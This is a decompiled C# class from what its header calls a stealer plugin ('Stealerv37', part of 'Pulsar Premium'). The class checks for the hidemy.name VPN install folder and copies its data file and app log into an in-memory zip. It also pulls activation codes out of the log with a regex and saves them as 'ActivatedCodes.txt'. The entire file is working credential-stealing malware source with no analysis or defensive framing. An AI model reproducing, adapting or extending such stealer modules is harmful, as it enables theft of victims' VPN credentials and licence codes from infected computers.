// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Vpn.HideMyName
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Vpn;

public class HideMyName : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = "C:\\Program Files\\hidemy.name VPN 2.0";
    if (!Directory.Exists(path))
      return;
    string str1 = nameof (HideMyName);
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (HideMyName);
    if (File.Exists(path + "\\HideMyName"))
    {
      zip.AddFile(str1 + "\\HideMyName", File.ReadAllBytes(path + "\\HideMyName"));
      counterApplications.Files.Add($"{path}\\HideMyName => {str1}\\HideMyName");
    }
    if (File.Exists(path + "\\log-app.txt"))
    {
      zip.AddFile(str1 + "\\log-app.txt", File.ReadAllBytes(path + "\\log-app.txt"));
      counterApplications.Files.Add($"{path}\\log-app.txt => {str1}\\log-app.txt");
      List<string> stringList = new List<string>();
      foreach (Match match in new Regex("code\\s+(\\d+)").Matches(File.ReadAllText(path + "\\log-app.txt")))
      {
        if (match.Success)
        {
          string str2 = match.Groups[1].Value;
          if (!stringList.Contains(str2))
            stringList.Add(str2);
        }
      }
      if (stringList.Count<string>() > 0)
      {
        zip.AddTextFile(str1 + "\\ActivatedCodes.txt", string.Join("\n", (IEnumerable<string>) stringList));
        counterApplications.Files.Add($"{path}\\log-app.txt => {str1}\\ActivatedCodes.txt");
      }
    }
    counterApplications.Files.Add($"{path} => {str1}");
    counterApplications.Files.Add(str1);
    counter.Vpns.Add(counterApplications);
  }
}
